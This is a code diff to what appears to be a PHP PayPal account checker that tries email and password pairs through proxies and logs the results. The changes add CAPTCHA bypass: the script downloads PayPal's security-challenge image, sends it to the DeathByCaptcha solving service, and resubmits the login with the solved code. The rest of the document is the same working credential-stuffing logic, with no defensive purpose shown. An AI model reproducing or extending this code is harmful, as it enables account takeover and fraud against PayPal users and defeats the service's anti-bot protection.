@@ -140,6 +140,7 @@ function curl($url = '', $var = '', $header = false, $nobody = false) {
     curl_close($curl);
     return $result;
 }
+
 function fetch_value($str, $find_start, $find_end) {
     $start = strpos($str, $find_start);
     if ($start === false) {
@@ -148,6 +149,15 @@ function fetch_value($str, $find_start, $find_end) {
     $length = strlen($find_start);
     $end = strpos(substr($str, $start + $length), $find_end);
     return trim(substr($str, $start + $length, $end));
+}
+function fetch_value_notrim($str, $find_start, $find_end) {
+    $start = strpos($str, $find_start);
+    if ($start === false) {
+        return "";
+    }
+    $length = strlen($find_start);
+    $end = strpos(substr($str, $start + $length), $find_end);
+    return substr($str, $start + $length, $end);
 }
 $dir = dirname(__FILE__);
 $config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
@@ -319,12 +329,40 @@ file_put_contents($file, $title);
         if (stripos($s, 'security challenge') !== false) {
             //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
 			pushPaypalDie("<b style=\"color:red\">Captcha</b> => $sock | $email | $pwd | $title | $captcha");
-$captcha = fetch_value($s, '<p class="ngCaptcha"><img src="', '" border="0" alt="Server created challenge image" t');
+$captcha = fetch_value_notrim($s, '<p class="ngCaptcha"><img src="', '&#x3f;version&#x3d;');
+$imagestring=curl($captcha);
+imagejpeg(imagecreatefromstring($imagestring),"secret".".jpeg");
+$death_array=array();
+    if ($captcha1 = $client->upload($captcha_filename)) {
+        //echo "CAPTCHA {$captcha['captcha']} uploaded\n";
+
+        sleep(DeathByCaptcha_Client::DEFAULT_TIMEOUT);
+
+        // Poll for CAPTCHA text:
+        if ($text = $client->get_text($captcha1['captcha'])) {
+            //echo "CAPTCHA {$captcha['captcha']} solved: {$text}\n";
+			//echo $text.'<br/>';
+			//$var = 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&securityCode='.$text.'&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows&gif_continue.x=Continue';
+			$var='myAllTextSubmitID=&cmd=_login-submit&auction_type=&gif_challenge_key=&securityCode='.$text.'&gif_continue.x=Continue&auth=';
+			$auth=fetch_value($s,'<input name="auth" type="hidden" value="','"><input name="form_charset" type="hidden" value="UTF-8"></form>');
+			$var.=$auth.'&form_charset=UTF-8';
+			$s = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0fa72c947f193f8fd', $var);
+			//echo $s;
+            // Report an incorrectly solved CAPTCHA.
+            // Make sure the CAPTCHA was in fact incorrectly solved!
+            //$client->report($captcha['captcha']);
+        }
+    }
+/*$death_array=$client->upload(file_get_contents("secret.jpeg");//'base64:'.base64_encode($imagestring)
+var_dump($death_array);
+$captcha_text=$death_array['text'];
+echo $captcha_text.'<br/>';*/
+//echo 'Captcha: '.$captcha_text.'<br/>';
 //grab_image();
 
             			//pushPaypalDie("<b style=\"color:red\">Hit the Captcha Bullshit Again</b> => $title");
 			
-			continue;
+			//continue;
         }
         $checked++;
         $error = fetch_value($s, 's.prop14="', '"');
